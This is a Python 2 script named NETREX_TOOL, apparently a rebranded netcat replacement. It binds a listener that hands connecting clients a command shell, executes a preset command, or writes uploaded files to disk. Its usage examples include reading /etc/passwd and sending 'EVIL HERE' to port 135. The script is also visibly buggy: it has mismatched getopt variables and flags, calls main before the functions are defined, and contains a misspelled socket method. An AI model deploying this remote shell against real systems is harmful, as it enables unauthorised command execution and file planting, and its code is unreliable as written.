#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
#  NETREX_TOOL.py
#  
#  Copyright 2020 cybernetic <cybernetic@parrot>
#  
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 3 of the License, or
#  (at your option) any later version.
#  
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#  
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#  MA 02110-1301, USA.

import sys
import socket
import getopt
import threading
import subprocess
listen=False
command =False
upload=False
excute=""
target=""
upload_destination=""
port=0
def usage():
    print "NETREX TOOL"
    print
    print
    print "CYBERNETIC PROJECT"
    print "CREATED BY:Justin Seitz AND EVILREX"
    print "SUPPORTED BY : CYBERNETIC__OFFICIAL"
    print
    print
    print "usage:NETREX.PY -t target_host -p port"
    print "-l  --listen             -listen on [host]:[port] for incoming connections"
    print "-e  --excute             -excute given.file upon reciving a connection "
    print "-c  --command            -command shell interface  "
    print "-u  --upload_destination -upon reciving connetion upload a file and write to [destination]          "
    print 
    print
    print "examples"
    print "NETREX.PY -t 0.0.0.0 -p 0000 -l -c"
    print "NETREX.PY -t 0.0.0.0 -p 0000 -l -u=c:\\target.exe"
    print "NETREX.PY -t 0.0.0.0 -p 0000 -l -e=\"cat /etc/passwd\""
    print "echo 'EVIL HERE' | ./NETREX.PY -t 1.2.3.4.5 -p 135"
    sys.exit(0)
def main():
    global listen
    global port
    global excute
    global excute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
            usage()
    
    try:
            opt, args=getopt.getopt([sys.argv[1:]],"hle:t:P:cu",["help","listen","excute","target","port","command","upload"])
        
    except getopt.GetoptError as err:
            print str(err)
            usage()
    
    for o,a in opts:
            if o in ("-h","--help"):
                    usage()
            elif o in ("-l","--listen"):
                listen=True
            elif o in ("-e","--excute"):
                excute=a

            elif o in ("-c","--command"):
                command=True
            elif o in ("-u","--upload_destination"):
                upload_destination=a
            elif o in ("-t","--target"):
                target=a
            elif o in ("-p","--port"):
                 port=a
            else:
                assert False,"unhandled option"

    if not listen and len(target) and port >0:
           buffer =sys.stdin.read()
           client_sender(buffer)
    if listen:
            server_loop()
main()
def client_sender(buffer):
    client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        client.connect((target,port))
        if len(buffer):
            client.send(buffer)
        while True:
            recv_len=1
            response=""
            while recv_len:
                data=client.recv(4096)
                recv_len=len(data)
                response+=data
                if recv_len<4096:
                    break

            print response,
            buffer=raw_input("")
            buffer+="\n"
    except:
        print "[*] exception exiting!"
        client.close()

def server_loop():
    global target
    if not len(target):
        target="0.0.0.0"
    server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.bind((target,port))
    server.listen(5)
    while True:
        client_socket,addr=server.accept()
        client_thread=threading.Thread(target=client_handler,args=(client_socket,))
        client_thread.start()

def run_command(command):
    command=command.rstrip()
    try:
        output=subprocess.check_output(command,stderr=subprocess.STDOUT,shell=True)
    except:
        output="failed excute command.\r\n"
    return output
def client_handler(client_socket):
    global upload
    global excute
    global command
    if len(upload_destination):
        file_buffer=""
        while True:
            data=client_socket.recv(1024)
            if not data:
                break
            else:
                file_buffer+=data

        try:

            file_descriptor=open(upload_destination,"wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()
            client_socket.end("sucessfully to save to %s\r\n"%upload_destination)
        except:
            client_socket.send("failed to save file to %s\r\n"%upload_destination)

    if len(excute):
        output=run_command(excute)
        client_socket.send(output)
    if command:
        while True:
            client_socket.send("< NETX:#>")
            cmd_buffer=""
            while "\n" not in cmd_buffer:
                cmd_buffer+=client_socket.recv(1024)
            response=run_command(cmd_buffer)
            client_socket.send(response)








        
    



